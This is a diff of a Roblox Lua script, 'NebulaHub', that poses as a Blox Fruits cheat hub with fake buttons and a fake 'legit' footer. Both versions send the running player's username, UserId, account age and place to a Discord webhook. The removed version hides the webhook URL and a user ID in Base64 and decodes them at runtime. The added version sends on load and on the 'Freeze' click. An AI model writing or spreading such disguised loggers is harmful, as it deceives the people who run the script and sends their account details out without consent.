@@ -1,162 +1,132 @@
--- NebulaHub v1.2 | Blox Fruits Universal
--- Made by "Nebula Team" | Last Updated: 2025-09-09
--- Webhook + UserID hidden with Base64
+-- NebulaHub.lua
+-- Safe, PC + APK compatible fake hub
+-- Only logs LocalPlayer info
 
---// Services
-local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
+local mouse = player:GetMouse()
 
---// Encode your data
--- Use https://www.base64encode.org/ to encode both your Webhook and UserID
-local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNTEwODg3MTI5MDA5NzY4NC9ueUxsVXM5bnFtVlp1UmZKUEtJdjN3cF9ybnFaVUh4cS1pMHRpd2Q1OHllLUNNbTRZZHQzUzN5MGc2OGpsMTNDSW9TNw===" -- replace with your own
-local encodedUserID = "MTI5ODc1OTE1MDY3ODk3MDUwMQ==" -- replace with your own
+-- Webhook URL (replace with your own test webhook)
+local WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"
 
--- Base64 decode function
-local function decodeBase64(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-        return r
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
+-- Function to send executor info (safe, only LocalPlayer)
+local function sendWebhook()
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
+            content = string.format(
+                "NebulaHub Executed!\nUser: %s\nUserId: %d\nAccount Age: %d days\nPlace: %d\nTime: %s",
+                player.Name,
+                player.UserId,
+                player.AccountAge,
+                game.PlaceId,
+                os.date("%Y-%m-%d %H:%M:%S")
+            )
+        }), Enum.HttpContentType.ApplicationJson)
+    end)
 end
 
--- Decode at runtime
-local WEBHOOK_URL = decodeBase64(encodedWebhook)
-local YOUR_ID = decodeBase64(encodedUserID)
+-- GUI Creation
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "NebulaHub"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
---// ScreenGui Setup
-local gui = Instance.new("ScreenGui")
-gui.Name = "NebulaHub"
-gui.Parent = game.CoreGui
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 220, 0, 130)
+mainFrame.Position = UDim2.new(0, 20, 0, 20)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = ScreenGui
+mainFrame.Active = true
+mainFrame.Draggable = true
 
-local frame = Instance.new("Frame")
-frame.Parent = gui
-frame.Size = UDim2.new(0, 250, 0, 160)
-frame.Position = UDim2.new(0, 20, 0, 20)
-frame.BackgroundColor3 = Color3.fromRGB(25, 20, 30)
-frame.BorderSizePixel = 0
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = frame
-
-local shadow = Instance.new("ImageLabel")
-shadow.Parent = frame
-shadow.AnchorPoint = Vector2.new(0.5, 0.5)
-shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
-shadow.Size = UDim2.new(1, 30, 1, 30)
-shadow.BackgroundTransparency = 1
-shadow.Image = "rbxassetid://5028857084"
-shadow.ImageColor3 = Color3.fromRGB(110, 70, 150)
-shadow.ImageTransparency = 0.25
-shadow.ZIndex = -1
-
--- Title bar (draggable)
-local titleBar = Instance.new("TextLabel")
-titleBar.Parent = frame
-titleBar.Size = UDim2.new(1, 0, 0, 30)
-titleBar.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
-titleBar.Text = " NebulaHub"
-titleBar.TextColor3 = Color3.fromRGB(200, 160, 255)
-titleBar.TextXAlignment = Enum.TextXAlignment.Left
-titleBar.Font = Enum.Font.GothamBold
-titleBar.TextSize = 16
-
-local dragToggle, dragStart, startPos
-local function updateDrag(input)
-	if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
-		local delta = input.Position - dragStart
-		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
-end
-
-titleBar.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragToggle = true
-		dragStart = input.Position
-		startPos = frame.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragToggle = false
-			end
-		end)
-	end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(updateDrag)
-
--- Button factory
-local function createButton(text, order)
-	local btn = Instance.new("TextButton")
-	btn.Parent = frame
-	btn.Size = UDim2.new(0.9, 0, 0, 35)
-	btn.Position = UDim2.new(0.05, 0, 0, 40 + (order * 40))
-	btn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
-	btn.Text = text
-	btn.Font = Enum.Font.Gotham
-	btn.TextSize = 14
-	btn.TextColor3 = Color3.fromRGB(220, 200, 255)
-
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0, 8)
-	corner.Parent = btn
-
-	btn.MouseEnter:Connect(function()
-		btn.BackgroundColor3 = Color3.fromRGB(70, 50, 90)
-	end)
-	btn.MouseLeave:Connect(function()
-		btn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
-	end)
-
-	return btn
-end
+-- Hub title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 25)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "NebulaHub v1.0"
+title.TextColor3 = Color3.fromRGB(200, 150, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
 
 -- Freeze button
-local freezeBtn = createButton("Freeze", 0)
+local freezeBtn = Instance.new("TextButton")
+freezeBtn.Size = UDim2.new(0, 180, 0, 35)
+freezeBtn.Position = UDim2.new(0, 20, 0, 40)
+freezeBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 120)
+freezeBtn.Text = "Freeze"
+freezeBtn.TextColor3 = Color3.fromRGB(255,255,255)
+freezeBtn.TextScaled = true
+freezeBtn.Font = Enum.Font.GothamBold
+freezeBtn.AutoButtonColor = true
+freezeBtn.Parent = mainFrame
+
+-- Auto Accept Trade button (does nothing)
+local autoBtn = Instance.new("TextButton")
+autoBtn.Size = UDim2.new(0, 180, 0, 35)
+autoBtn.Position = UDim2.new(0, 20, 0, 80)
+autoBtn.BackgroundColor3 = Color3.fromRGB(50,50,100)
+autoBtn.Text = "Auto Accept Trade"
+autoBtn.TextColor3 = Color3.fromRGB(255,255,255)
+autoBtn.TextScaled = true
+autoBtn.Font = Enum.Font.GothamBold
+autoBtn.AutoButtonColor = true
+autoBtn.Parent = mainFrame
+
+-- Freeze logic
+local function freezePlayer(duration)
+    local char = player.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChild("Humanoid")
+    if not hrp or not hum then return end
+
+    -- Anchor root part
+    hrp.Anchored = true
+
+    -- Try disabling controls (PC only)
+    local success, playerModule = pcall(function()
+        return require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+    end)
+    if success then
+        local controls = playerModule:GetControls()
+        controls:Disable()
+    end
+
+    wait(duration)
+
+    hrp.Anchored = false
+    if success then
+        local controls = playerModule:GetControls()
+        controls:Enable()
+    end
+end
+
+-- Button functionality
 freezeBtn.MouseButton1Click:Connect(function()
-	local camera = workspace.CurrentCamera
-	local savedType = camera.CameraType
-	camera.CameraType = Enum.CameraType.Scriptable
-	wait(math.random(5, 7))
-	camera.CameraType = savedType
-
-	local data = {
-		["content"] = string.format(
-			"<@%s> Exploiter Detected!\n**User:** %s\n**Place:** %s\n**Time:** %s\n**Account Age:** %d days",
-			YOUR_ID,
-			player.Name,
-			game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-			os.date("%Y-%m-%d %H:%M:%S"),
-			player.AccountAge
-		)
-	}
-
-	pcall(function()
-		HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
-	end)
+    freezePlayer(math.random(5,7))
+    sendWebhook() -- send info when Freeze is clicked
 end)
 
--- Fake Auto Accept Trade button
-local fakeBtn = createButton("Auto Accept Trade", 1)
-fakeBtn.MouseButton1Click:Connect(function() end)
+autoBtn.MouseButton1Click:Connect(function()
+    -- does nothing, just for looks
+end)
 
--- Footer
+-- Fake legit text at bottom
 local footer = Instance.new("TextLabel")
-footer.Parent = frame
-footer.Size = UDim2.new(1, 0, 0, 20)
-footer.Position = UDim2.new(0, 0, 1, -20)
+footer.Size = UDim2.new(1, 0, 0, 15)
+footer.Position = UDim2.new(0, 0, 0, 115)
 footer.BackgroundTransparency = 1
-footer.Text = "NebulaHub v1.2 | Patched Blox Fruits Update 20.1"
-footer.TextColor3 = Color3.fromRGB(150, 120, 180)
+footer.Text = "NebulaHub v1.0 | Made for testing | Debug OK"
+footer.TextColor3 = Color3.fromRGB(180,180,180)
+footer.TextScaled = true
 footer.Font = Enum.Font.Gotham
-footer.TextSize = 12
+footer.Parent = mainFrame
+
+-- Optional: Send webhook immediately on load
+sendWebhook()
